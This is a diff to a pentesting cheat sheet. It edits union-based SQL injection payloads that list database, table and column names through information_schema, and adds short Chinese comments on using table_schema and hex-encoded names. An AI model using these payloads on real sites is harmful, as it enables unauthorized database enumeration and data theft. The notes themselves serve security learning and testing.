@@ -111,11 +111,12 @@ Here are some tricks of pentesting, step by step from find the vulnerability to 
 ...union select 1,2,...,group_concat(schema_name) from information_schema.schemata--+  // get all database name
 ```  
 ```
-...union select 1,2,...,group_concat(table_name) from information_schema.tables where schema_name='FUCK'+--+  
+...union select 1,2,...,group_concat(table_name) from information_schema.tables where table_schema='FUCK'+--+  
 // FUCK那邊也可以用hex表示
 ```
 ```
 ...union select 1,2,...,group_concat(column_name) from information_schema.columns where table_name='users'+--+
+// 這邊還是比較喜歡用table_schema,如果懶得決定要鎖定哪張表XD...
 ```
 ```
 // 最終目的
